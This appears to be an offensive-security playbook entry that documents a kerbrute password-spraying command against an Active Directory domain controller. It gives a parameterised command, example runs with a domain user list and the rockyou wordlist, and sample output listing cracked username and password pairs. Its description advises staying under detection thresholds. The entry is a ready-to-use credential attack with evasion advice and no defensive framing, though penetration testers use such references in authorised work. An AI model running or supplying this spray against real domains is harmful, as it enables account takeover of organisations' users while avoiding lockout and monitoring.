---
type: command
executor: bash
data: >-
  ./kerbrute_linux_amd64 passwordspray -d $_DOMAIN --dc $_DC_IP $_USERS_FILE
  $_PASSWORD_FILE
output: null
created_at: '2023-04-06T03:56:04.255388+00:00'
updated_at: '2023-04-10T20:36:09.930886+00:00'
platforms:
  - Linux
tags:
  - spray
  - kerberos
verified: true
validated: true
---

# kerbrute-password-spray-wordlist

## Command

```bash
./kerbrute_linux_amd64 passwordspray -d $_DOMAIN --dc $_DC_IP $_USERS_FILE $_PASSWORD_FILE
```

## Description

This command sprays a full password wordlist across multiple usernames, testing combinations via Kerberos pre-auth. Use cautiously to avoid detection thresholds.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -d $_DOMAIN | Target domain | Yes |
| --dc $_DC_IP | DC IP | Yes |
| $_USERS_FILE | Usernames file | Yes |
| $_PASSWORD_FILE | Password wordlist file | Yes |

## Examples

### Basic Usage

```bash
./kerbrute_linux_amd64 passwordspray -d domain.local --dc 10.10.10.10 domain_users.txt rockyou.txt
```

### Advanced Usage

```bash
./kerbrute_linux_amd64 passwordspray -d domain.local --dc 10.10.10.10 users.txt common_passwords.txt
```

## Expected Output

Reports successful combinations:

```
[+] SUCCESS: user1@domain.local:summer22
[+] SUCCESS: user2@domain.local:password
```

## Related

- [[procedures/Kerberos-Pre-Auth-Bruteforcing]]
- [[tools/kerbrute]]
